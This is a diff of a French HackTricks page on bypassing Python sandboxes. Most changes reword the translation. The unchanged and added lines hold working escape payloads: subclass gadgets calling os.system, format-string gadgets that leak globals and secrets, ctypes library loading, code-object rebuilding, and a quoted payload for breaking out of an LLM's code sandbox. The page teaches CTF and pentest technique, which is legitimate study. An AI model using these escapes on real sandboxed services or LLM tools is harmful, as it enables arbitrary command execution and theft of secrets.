@@ -15,15 +15,13 @@ Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="
 </details>
 {% endhint %}
 
-<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-**Obtenez la perspective d'un hacker sur vos applications web, votre réseau et votre cloud**
+**Obtenez la perspective d'un hacker sur vos applications web, votre réseau et le cloud**
 
 **Trouvez et signalez des vulnérabilités critiques et exploitables ayant un impact commercial réel.** Utilisez nos 20+ outils personnalisés pour cartographier la surface d'attaque, trouver des problèmes de sécurité qui vous permettent d'escalader les privilèges, et utilisez des exploits automatisés pour collecter des preuves essentielles, transformant votre travail acharné en rapports convaincants.
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
-
-
 
 Voici quelques astuces pour contourner les protections des sandboxes Python et exécuter des commandes arbitraires.
 
@@ -177,7 +175,7 @@ Il est également possible de le contourner en utilisant d'autres encodages, par
 
 ## Exécution Python sans appels
 
-Si vous êtes dans une prison python qui **ne vous permet pas de faire des appels**, il existe encore des moyens d'**exécuter des fonctions, du code** et des **commandes arbitraires**.
+Si vous êtes à l'intérieur d'une prison python qui **ne vous permet pas de faire des appels**, il existe encore des moyens d'**exécuter des fonctions, du code** et des **commandes arbitraires**.
 
 ### RCE avec [décorateurs](https://docs.python.org/3/glossary.html#term-decorator)
 ```python
@@ -276,7 +274,7 @@ Sub['import os; os.system("sh")']
 ```
 #### Création d'objets avec des exceptions
 
-Lorsque une **exception est déclenchée**, un objet de l'**Exception** est **créé** sans que vous ayez besoin d'appeler le constructeur directement (un truc de [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
+Lorsque une **exception est déclenchée**, un objet de **l'Exception** est **créé** sans que vous ayez besoin d'appeler le constructeur directement (un truc de [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -469,7 +467,7 @@ Par exemple, sachant qu'avec la bibliothèque **`sys`** il est possible de **imp
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
 ```
-Il y en a beaucoup, et **nous n'avons besoin que d'un** pour exécuter des commandes :
+Il y en a beaucoup, et **nous n'avons besoin que d'un seul** pour exécuter des commandes :
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
@@ -563,7 +561,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## Recherche Récursive des Builtins, Globals...
 
 {% hint style="warning" %}
-C'est tout simplement **incroyable**. Si vous **cherchez un objet comme globals, builtins, open ou autre**, utilisez simplement ce script pour **trouver de manière récursive les endroits où vous pouvez trouver cet objet.**
+C'est juste **incroyable**. Si vous **cherchez un objet comme globals, builtins, open ou autre** utilisez simplement ce script pour **trouver de manière récursive les endroits où vous pouvez trouver cet objet.**
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -708,7 +706,7 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Notez comment vous pouvez **accéder aux attributs** de manière normale avec un **point** comme `people_obj.__init__` et **élément de dict** avec **parenthèses** sans guillemets `__globals__[CONFIG]`
+Notez comment vous pouvez **accéder aux attributs** de manière normale avec un **point** comme `people_obj.__init__` et **élément dict** avec **parenthèses** sans guillemets `__globals__[CONFIG]`
 
 Notez également que vous pouvez utiliser `.__dict__` pour énumérer les éléments d'un objet `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
@@ -754,16 +752,20 @@ secret_variable = "clueless"
 x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
 str(x) # Out: clueless
 ```
-### De format à RCE en chargeant des bibliothèques
+### Contournement des prisons LLM
 
-Selon le [**TypeMonkey chall de cet article**](https://corgi.rip/posts/buckeye-writeups/), il est possible de charger des bibliothèques arbitraires depuis le disque en abusant de la vulnérabilité de chaîne de format dans python.
+Depuis [ici](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`
+
+### Du format à l'exécution de code à distance en chargeant des bibliothèques
+
+Selon le [**challenge TypeMonkey de cet article**](https://corgi.rip/posts/buckeye-writeups/), il est possible de charger des bibliothèques arbitraires depuis le disque en abusant de la vulnérabilité de chaîne de format dans python.
 
 En rappel, chaque fois qu'une action est effectuée en python, une fonction est exécutée. Par exemple, `2*3` exécutera **`(2).mul(3)`** ou **`{'a':'b'}['a']`** sera **`{'a':'b'}.__getitem__('a')`**.
 
-Vous en avez d'autres comme cela dans la section [**Exécution Python sans appels**](./#python-execution-without-calls).
+Vous en avez plus comme ça dans la section [**Exécution Python sans appels**](./#python-execution-without-calls).
 
-Une vulnérabilité de chaîne de format python ne permet pas d'exécuter de fonction (elle ne permet pas d'utiliser des parenthèses), donc il n'est pas possible d'obtenir RCE comme `'{0.system("/bin/sh")}'.format(os)`.\
-Cependant, il est possible d'utiliser `[]`. Par conséquent, si une bibliothèque python courante a une méthode **`__getitem__`** ou **`__getattr__`** qui exécute du code arbitraire, il est possible de les abuser pour obtenir RCE.
+Une vulnérabilité de chaîne de format python ne permet pas d'exécuter de fonction (elle ne permet pas d'utiliser des parenthèses), donc il n'est pas possible d'obtenir une exécution de code à distance comme `'{0.system("/bin/sh")}'.format(os)`.\
+Cependant, il est possible d'utiliser `[]`. Par conséquent, si une bibliothèque python courante a une méthode **`__getitem__`** ou **`__getattr__`** qui exécute du code arbitraire, il est possible de les abuser pour obtenir une exécution de code à distance.
 
 À la recherche d'un gadget comme ça en python, l'article propose cette [**requête de recherche Github**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code). Où il a trouvé celui-ci [ici](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463):
 ```python
@@ -791,7 +793,7 @@ Ce gadget permet de **charger une bibliothèque depuis le disque**. Par conséqu
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
-Le défi abuse en fait d'une autre vulnérabilité sur le serveur qui permet de créer des fichiers arbitraires sur le disque des serveurs.
+Le défi abuse en réalité d'une autre vulnérabilité sur le serveur qui permet de créer des fichiers arbitraires sur le disque des serveurs.
 
 ## Dissection des objets Python
 
@@ -799,7 +801,7 @@ Le défi abuse en fait d'une autre vulnérabilité sur le serveur qui permet de 
 Si vous voulez **apprendre** sur le **bytecode python** en profondeur, lisez ce **superbe** article sur le sujet : [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
-Dans certains CTF, vous pourriez recevoir le nom d'une **fonction personnalisée où le flag** réside et vous devez voir les **internes** de la **fonction** pour l'extraire.
+Dans certains CTFs, vous pourriez recevoir le nom d'une **fonction personnalisée où le flag** réside et vous devez examiner les **internes** de la **fonction** pour l'extraire.
 
 C'est la fonction à inspecter :
 ```python
@@ -922,7 +924,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Remarquez que **si vous ne pouvez pas importer `dis` dans le sandbox python**, vous pouvez obtenir le **bytecode** de la fonction (`get_flag.func_code.co_code`) et **le désassembler** localement. Vous ne verrez pas le contenu des variables en cours de chargement (`LOAD_CONST`), mais vous pouvez les deviner à partir de (`get_flag.func_code.co_consts`) car `LOAD_CONST` indique également le décalage de la variable en cours de chargement.
+Remarquez que **si vous ne pouvez pas importer `dis` dans le sandbox python**, vous pouvez obtenir le **bytecode** de la fonction (`get_flag.func_code.co_code`) et **le désassembler** localement. Vous ne verrez pas le contenu des variables étant chargées (`LOAD_CONST`), mais vous pouvez les deviner à partir de (`get_flag.func_code.co_consts`) car `LOAD_CONST` indique également le décalage de la variable étant chargée.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -946,7 +948,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ```
 ## Compilation de Python
 
-Maintenant, imaginons que d'une manière ou d'une autre, vous pouvez **extraire les informations sur une fonction que vous ne pouvez pas exécuter** mais que vous **devez** **l'exécuter**.\
+Maintenant, imaginons que d'une manière ou d'une autre, vous pouvez **extraire les informations sur une fonction que vous ne pouvez pas exécuter** mais que vous **devez** **exécuter**.\
 Comme dans l'exemple suivant, vous **pouvez accéder à l'objet de code** de cette fonction, mais en lisant simplement le désassemblage, vous **ne savez pas comment calculer le flag** (_imaginez une fonction `calc_flag` plus complexe_)
 ```python
 def get_flag(some_input):
@@ -960,9 +962,9 @@ return calc_flag("VjkuKuVjgHnci")
 else:
 return "Nope"
 ```
-### Creating the code object
+### Création de l'objet code
 
-Tout d'abord, nous devons savoir **comment créer et exécuter un objet code** afin que nous puissions en créer un pour exécuter notre fonction leak :
+Tout d'abord, nous devons savoir **comment créer et exécuter un objet code** afin de pouvoir en créer un pour exécuter notre fonction leak :
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -993,7 +995,7 @@ types.CodeType.__doc__
 ### Recréer une fonction divulguée
 
 {% hint style="warning" %}
-Dans l'exemple suivant, nous allons prendre toutes les données nécessaires pour recréer la fonction directement à partir de l'objet de code de la fonction. Dans un **exemple réel**, toutes les **valeurs** pour exécuter la fonction **`code_type`** sont ce que **vous devrez divulguer**.
+Dans l'exemple suivant, nous allons prendre toutes les données nécessaires pour recréer la fonction directement à partir de l'objet de code de la fonction. Dans un **exemple réel**, toutes les **valeurs** pour exécuter la fonction **`code_type`** sont ce dont **vous aurez besoin pour leaker**.
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -1007,7 +1009,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-Dans les exemples précédents au début de ce post, vous pouvez voir **comment exécuter n'importe quel code python en utilisant la fonction `compile`**. C'est intéressant car vous pouvez **exécuter des scripts entiers** avec des boucles et tout le reste en une **ligne** (et nous pourrions faire la même chose en utilisant **`exec`**).\
+Dans les exemples précédents au début de ce post, vous pouvez voir **comment exécuter n'importe quel code python en utilisant la fonction `compile`**. C'est intéressant car vous pouvez **exécuter des scripts entiers** avec des boucles et tout dans une **ligne** (et nous pourrions faire la même chose en utilisant **`exec`**).\
 Quoi qu'il en soit, parfois il pourrait être utile de **créer** un **objet compilé** sur une machine locale et de l'exécuter sur la **machine CTF** (par exemple parce que nous n'avons pas la fonction `compiled` dans le CTF).
 
 Par exemple, compilons et exécutons manuellement une fonction qui lit _./poc.py_:
@@ -1080,7 +1082,7 @@ will be bypassed
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
 **Obtenez la perspective d'un hacker sur vos applications web, votre réseau et le cloud**
 
@@ -1098,7 +1100,7 @@ Apprenez et pratiquez le hacking GCP : <img src="../../../.gitbook/assets/grte.p
 
 * Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez des astuces de hacking en soumettant des PR au** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
+* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
 {% endhint %}
